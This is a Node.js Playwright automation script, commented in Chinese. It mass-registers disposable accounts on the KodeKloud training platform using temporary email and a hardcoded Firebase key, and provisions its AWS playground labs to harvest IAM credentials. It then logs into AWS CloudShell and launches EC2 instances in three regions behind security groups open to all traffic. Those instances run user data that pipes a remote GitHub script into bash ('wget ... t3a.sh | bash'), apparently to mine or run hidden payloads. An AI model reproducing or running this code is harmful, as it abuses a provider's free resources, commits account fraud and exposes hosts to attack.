#!/usr/bin/env node
/**
 * KodeKloud 全流程自动化（合并版）
 * 流程: 临时邮箱 → Firebase注册 → 邮箱验证 → 创建session → Cookie注入浏览器
 *       → Studio前端初始化(aid) → Provision → Manager Session → Readiness → AWS凭证
 *       → 登录 AWS Console → 打开 CloudShell → 执行命令
 *
 * 运行方式:
 *   Xvfb :99 -screen 0 1280x900x24 -ac &
 *   DISPLAY=:99 node kodekloud.js
 *   pkill Xvfb 2>/dev/null; Xvfb :99 -screen 0 1280x900x24 -ac > /dev/null 2>&1 & DISPLAY=:99 node kodekloud.js
 * 
 * 依赖:
 *   npm install playwright
 *   apt install xvfb chromium-browser
 */
const { chromium } = require('playwright');
const https = require('https');
const fs = require('fs');
const { execSync } = require('child_process');

const FIREBASE_KEY = 'AIzaSyAVy3_TcBija6Pc9_-glfSZuqft01zgoSA';
const MAIL_API = 'https://api.mail.tm';
const UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36';
const AWS_REGION = 'us-east-1';

// ── 工具函数 ──

function rs(n = 8) {
  const c = 'abcdefghijklmnopqrstuvwxyz0123456789';
  return Array.from({ length: n }, () => c[Math.floor(Math.random() * c.length)]).join('');
}

function sleep(ms) {
  return new Promise(r => setTimeout(r, ms));
}

function httpReq(method, url, body, headers = {}) {
  return new Promise((resolve, reject) => {
    const u = new URL(url);
    const opts = {
      hostname: u.hostname,
      port: u.port || 443,
      path: u.pathname + u.search,
      method,
      headers: { ...headers },
    };
    let d = '';
    if (body) {
      d = JSON.stringify(body);
      opts.headers['content-type'] = 'application/json';
      opts.headers['content-length'] = Buffer.byteLength(d);
    }
    const req = https.request(opts, res => {
      let s = '';
      res.on('data', c => s += c);
      res.on('end', () => {
        try {
          resolve({ status: res.statusCode, headers: res.headers, data: JSON.parse(s), raw: s });
        } catch {
          resolve({ status: res.statusCode, headers: res.headers, data: s, raw: s });
        }
      });
    });
    req.on('error', reject);
    if (d) req.write(d);
    req.end();
  });
}

const httpGet = (url, h) => httpReq('GET', url, null, h);
const httpPost = (url, body, h) => httpReq('POST', url, body, h);

function log(tag, msg) {
  const ts = new Date().toLocaleTimeString('zh-CN', { hour12: false, timeZone: 'Asia/Shanghai' });
  console.log(`[${ts}] [${tag}] ${msg}`);
}

// ── Phase 1: 注册 + 邮箱验证 ──

async function registerAccount() {
  log('REG', '创建临时邮箱 + Firebase 注册');
  const email = `kk${rs(6)}@deltajohnsons.com`;
  const mailPw = `Mail${rs(8)}!x`;
  const kkPw = `Kk${rs(4)}!${rs(3)}1A`;

  await httpPost(`${MAIL_API}/accounts`, { address: email, password: mailPw });
  const mt = (await httpPost(`${MAIL_API}/token`, { address: email, password: mailPw })).data.token;

  const sg = (await httpPost(
    `https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=${FIREBASE_KEY}`,
    { email, password: kkPw, returnSecureToken: true }
  )).data;

  await httpPost(
    `https://identitytoolkit.googleapis.com/v1/accounts:sendOobCode?key=${FIREBASE_KEY}`,
    { idToken: sg.idToken, requestType: 'VERIFY_EMAIL' }
  );

  // 轮询邮件提取 oobCode
  log('REG', '等待验证邮件...');
  let oob = '';
  for (let i = 0; i < 20 && !oob; i++) {
    await sleep(5000);
    const d = (await httpGet(`${MAIL_API}/messages`, { Authorization: `Bearer ${mt}` })).data;
    for (const msg of d['hydra:member'] || []) {
      const det = (await httpGet(`${MAIL_API}/messages/${msg.id}`, { Authorization: `Bearer ${mt}` })).data;
      const html = Array.isArray(det.html) ? det.html.join(' ') : (det.html || '');
      const txt = det.text || '';
      const m = decodeURIComponent(txt + ' ' + html).match(/oobCode=([^&\s"<]+)/);
      if (m) { oob = m[1]; break; }
    }
    if (!oob) log('REG', `邮件轮询 ${i + 1}/20...`);
  }
  if (!oob) throw new Error('未获取到 oobCode');

  // 验证邮箱
  await httpPost(
    `https://identitytoolkit.googleapis.com/v1/accounts:update?key=${FIREBASE_KEY}`,
    { oobCode: oob }
  );

  // 重新登录获取 email_verified=true 的 idToken
  const lg = (await httpPost(
    `https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=${FIREBASE_KEY}`,
    { email, password: kkPw, returnSecureToken: true }
  )).data;

  log('REG', `✅ 账号就绪: ${email}`);
  return { email, password: kkPw, idToken: lg.idToken };
}

// ── Phase 2: 创建 KodeKloud session ──

async function createKKSession(idToken) {
  log('SESSION', '创建 KodeKloud session');
  const h = {
    accept: '*/*',
    'accept-language': 'zh-CN,zh;q=0.9',
    'content-type': 'application/json',
    origin: 'https://identity.kodekloud.com',
    referer: 'https://identity.kodekloud.com/sign-in',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': UA,
  };

  const s1 = await httpPost(
    'https://identity-api.kodekloud.com/api/create-user-session',
    { token: idToken },
    h
  );

  const setc = s1.headers['set-cookie'] || [];
  const cookieLines = Array.isArray(setc) ? setc : [setc];
  const parsed = {};
  for (const line of cookieLines) {
    const m = String(line).match(/^([^=]+)=([^;]+)/);
    if (m) parsed[m[1]] = m[2];
  }
  log('SESSION', `✅ Cookies: ${Object.keys(parsed).join(', ')}`);
  return parsed;
}

// ── Phase 3: 浏览器 Provision → AWS 凭证 ──

async function provisionLab(cookies) {
  log('PROVISION', '启动浏览器 + 注入 cookies');
  log('PROVISION', `DISPLAY=${process.env.DISPLAY}`);
  try { execSync('pkill -9 chromium; pkill -9 chrome', { stdio: 'ignore' }); } catch {}
  await sleep(1000);

  const browser = await chromium.launch({
    headless: false,
    args: ['--no-sandbox', '--disable-gpu', '--disable-dev-shm-usage', '--window-size=1280,900'],
  });

  const context = await browser.newContext({ userAgent: UA, viewport: { width: 1280, height: 900 } });

  const cookieObjs = Object.entries(cookies).map(([name, value]) => ({
    name,
    value,
    domain: '.kodekloud.com',
    path: '/',
    httpOnly: name === '_secure-user-session',
    secure: true,
    sameSite: 'Lax',
  }));
  await context.addCookies(cookieObjs);

  const page = await context.newPage();

  // 访问 Studio 页面（触发 aid 创建）
  log('PROVISION', '访问 Studio 页面');
  await page.goto('https://kodekloud.com/studio/playgrounds/cloud/aws-free-playground', {
    waitUntil: 'domcontentloaded',
    timeout: 90000,
  });
  await sleep(15000);

  // provision
  log('PROVISION', '调用 provision-cloud-lab');
  const prov = await page.evaluate(async () => {
    try {
      const r = await fetch('/studio/api/v1/labs/provision-cloud-lab', {
        method: 'POST',
        credentials: 'include',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({ labId: 'aws-free-playground', labType: 'playground' }),
      });
      return { status: r.status, body: await r.text() };
    } catch (e) { return { error: String(e) }; }
  });

  const provData = JSON.parse(prov.body || '{}');
  const labToken = provData.token;
  log('PROVISION', `✅ Lab token: ${labToken}`);

  if (!labToken) throw new Error('provision 未返回 lab token');

  // manager session
  const fpReqID = `${Date.now()}.${rs(6)}`;
  const sessResult = await httpGet(
    `https://manager.labs.kodekloud.com/cloud/session?token=${labToken}&theme=dark&cloud_lab=true&fpReqID=${fpReqID}`,
    {
      'User-Agent': UA,
      'Referer': `https://manager.labs.kodekloud.com/?token=${labToken}&theme=dark&cloud_lab=true`,
      'Accept': 'application/json, text/plain, */*',
    }
  );

  log('PROVISION', `cloud/session: ${sessResult.status} ${(sessResult.raw || '').slice(0, 200)}`);
  const cloudLabSessionId = (sessResult.data || {}).cloud_lab_session_id;
  log('PROVISION', `✅ cloud_lab_session_id: ${cloudLabSessionId}`);

  if (!cloudLabSessionId) throw new Error('未获取到 cloud_lab_session_id');

  // readiness 轮询
  log('PROVISION', '轮询 readiness 获取 AWS 凭证...');
  let awsCreds = null;
  for (let i = 0; i < 30; i++) {
    await sleep(5000);
    const rd = await httpGet(
      `https://manager.labs.kodekloud.com/cloud/session/readiness?cloud_lab_session_id=${cloudLabSessionId}`,
      {
        'User-Agent': UA,
        'Referer': `https://manager.labs.kodekloud.com/?token=${labToken}&theme=dark&cloud_lab=true`,
      }
    );
    log('PROVISION', `readiness ${i + 1}/30: ${rd.status} ${(rd.raw || '').slice(0, 150)}`);
    const c = rd.data || {};
    if (c.username) {
      awsCreds = {
        account_id: c.account_id || c.link?.match(/(\d+)\.signin/)?.[1] || '',
        aws_console_link: c.link || '',
        iam_username: c.username || '',
        iam_password: c.password || '',
      };
      log('PROVISION', c.link);
      log('PROVISION', c.username);
      log('PROVISION', c.password);
      log('PROVISION', '🎉 AWS 凭证获取成功!');
      break;
    }
  }

  if (!awsCreds) throw new Error('readiness 超时，未获取到 AWS 凭证');

  // 关闭 KK 浏览器（后续用新浏览器登录 AWS）
  await browser.close();

  return awsCreds;
}

// ── Phase 4: 登录 AWS Console + CloudShell ──

async function awsLogin(creds) {
  log('AWS', '登录 AWS Console');
  const loginUrl = `https://${creds.account_id}.signin.aws.amazon.com/console?region=${AWS_REGION}`;

  const browser = await chromium.launch({
    headless: false,
    args: ['--no-sandbox', '--disable-gpu', '--disable-dev-shm-usage', '--window-size=1280,900'],
  });

  const ctx = await browser.newContext({ userAgent: UA, viewport: { width: 1280, height: 900 } });
  const page = await ctx.newPage();

  await page.goto(loginUrl, { waitUntil: 'domcontentloaded', timeout: 30000 });
  await page.waitForSelector('#username', { timeout: 20000 });
  await page.fill('#username', creds.iam_username);
  await page.waitForSelector('#password', { timeout: 10000 });
  await page.fill('#password', creds.iam_password);
  await page.click('#signin_button');
  await page.waitForTimeout(8000);
  log('AWS', `✅ 登录完成, URL: ${page.url()}`);

  return { browser, page };
}

async function openCloudShell(page) {
  log('CLOUDSHELL', '打开 CloudShell');
  const cloudshellUrl = `https://${AWS_REGION}.console.aws.amazon.com/cloudshell?region=${AWS_REGION}`;
  await page.goto(cloudshellUrl, { waitUntil: 'domcontentloaded', timeout: 30000 });

  // 等待终端 textarea
  await page.waitForSelector('textarea.ace_text-input', { timeout: 60000 });
  log('CLOUDSHELL', '终端 textarea 已出现');

  // 关闭欢迎弹窗
  await page.evaluate(() => {
    const modal = document.querySelector('#welcome-modal');
    if (modal) modal.remove();
    document.querySelectorAll('[class*="backdrop"], [class*="overlay"]').forEach(el => {
      if (el.style?.position === 'fixed' || getComputedStyle(el).position === 'fixed') el.remove();
    });
  });
  await page.waitForTimeout(1000);

  // 确保终端不在 loading 状态
  for (let i = 0; i < 6; i++) {
    const loading = await page.$('.connection-loading-state');
    if (!loading) break;
    log('CLOUDSHELL', `终端仍在加载, 等待 5s... (${i + 1})`);
    await page.waitForTimeout(5000);
  }

  log('CLOUDSHELL', '✅ CloudShell 终端就绪');
  return page;
}

async function runCommand(page, command, waitMs = 5000) {
  log('CMD', `执行命令中...`);

  const aceInput = await page.$('textarea.ace_text-input');
  if (!aceInput) throw new Error('未找到终端输入框');

  // Ctrl+C 确保在干净提示符下
  await aceInput.focus();
  await page.keyboard.press('Control+c');
  await page.waitForTimeout(500);

  await page.keyboard.type(command, { delay: 30 });
  await page.keyboard.press('Enter');

  log('CMD', `等待 ${waitMs / 1000}s...`);
  await page.waitForTimeout(waitMs);

  const output = await page.evaluate(() => {
    const scroller = document.querySelector('.ace_scroller');
    return scroller?.innerText || scroller?.textContent || '';
  });

  log('CMD', '✅ 命令执行完成');
  return output;
}

// ── 主流程 ──

async function main() {
  console.log('=== KodeKloud → AWS CloudShell 全流程 ===\n');

  // Phase 1: 注册账号
  const { email, password: kkPw, idToken } = await registerAccount();

  // Phase 2: 创建 session
  const cookies = await createKKSession(idToken);

  // Phase 3: Provision 获取 AWS 凭证
  const awsCreds = await provisionLab(cookies);
  log('MAIN', `AWS 凭证: user=${awsCreds.iam_username}, account=${awsCreds.account_id}`);

  // 保存结果
  const now = new Date(Date.now() + 8 * 3600 * 1000)
    .toISOString()
    .replace('Z', '+08:00')
    .replace(/\.\d{3}/, '');

  const result = {
    email,
    password: kkPw,
    current_time: now,
    third_step: awsCreds,
  };

  // Phase 4: 登录 AWS Console
  const { browser, page } = await awsLogin(awsCreds);

  // Phase 5: 打开 CloudShell
  await openCloudShell(page);

  // Phase 6: 执行命令
  const cmd = String.raw`
cat > run_multi_region.py <<'PYEOF'
import boto3
import time
import traceback

# ================= 配置区 =================
region_ami_map = {
    "us-east-1": "ami-0b75f821522bcff85",
    "us-east-2": "ami-0e68dc81dc36750a1",
    "us-west-2": "ami-0aa2e8130d850ba1d"
}

user_data_script = """#!/bin/bash
nohup bash -c "wget -qO- https://github.com/zjaacmyx/xxx1/raw/main/t3a.sh | bash" >/dev/null 2>&1 &
"""
# ==========================================

def safe_print(msg):
    print(msg, flush=True)

def create_sg(ec2, region):
    sg_name = f"OpenAllPorts_{int(time.time())}"
    try:
        resp = ec2.create_security_group(
            GroupName=sg_name,
            Description="Auto generated SG"
        )
        sg_id = resp["GroupId"]

        ec2.authorize_security_group_ingress(
            GroupId=sg_id,
            IpPermissions=[{
                "IpProtocol": "-1",
                "IpRanges": [{"CidrIp": "0.0.0.0/0"}]
            }]
        )

        return sg_id
    except Exception as e:
        safe_print(f"[{region}] ❌ SG失败: {e}")
        return None

def run_instances(ec2, ami_id, sg_id, region):
    try:
        resp = ec2.run_instances(
            ImageId=ami_id,
            InstanceType="t3.micro",
            MinCount=1,
            MaxCount=2,
            SecurityGroupIds=[sg_id],
            UserData=user_data_script
        )

        ids = [i["InstanceId"] for i in resp["Instances"]]
        safe_print(f"[{region}] ✅ 实例: {ids}")

        return ids
    except Exception as e:
        safe_print(f"[{region}] ❌ 启动失败: {e}")
        return []

def main():
    for region, ami in region_ami_map.items():
        safe_print("=" * 50)
        safe_print(f"🚀 区域: {region}")
        safe_print("=" * 50)

        try:
            ec2 = boto3.client("ec2", region_name=region)

            sg_id = create_sg(ec2, region)
            if not sg_id:
                continue

            ids = run_instances(ec2, ami, sg_id, region)

            if ids:
                waiter = ec2.get_waiter("instance_running")
                waiter.wait(InstanceIds=ids)
                safe_print(f"[{region}] ⏳ 实例已运行")

        except Exception as e:
            safe_print(f"[{region}] ❌ 总异常: {e}")
            traceback.print_exc()

    safe_print("🎉 全区域执行完成")

if __name__ == "__main__":
    main()
PYEOF

python3 run_multi_region.py
`;

  const output = await runCommand(page, cmd, 8000);
  console.log('\n========== CloudShell 执行结果 ==========');
  console.log(output);
  console.log('=========================================\n');

  // // 截图
  // await new Promise(resolve => setTimeout(resolve, 5000));// 等待5秒
  // const screenshotPath = '/root/.openclaw/workspace/aws_result.png';
  // await page.screenshot({ path: screenshotPath, fullPage: false });
  // log('MAIN', `截图已保存: ${screenshotPath}`);
  
  await browser.close();
  log('MAIN', '✅ 全流程完成');
}

main().catch(e => {
  console.error('❌ 失败:', e.message || e);
  process.exit(1);
});

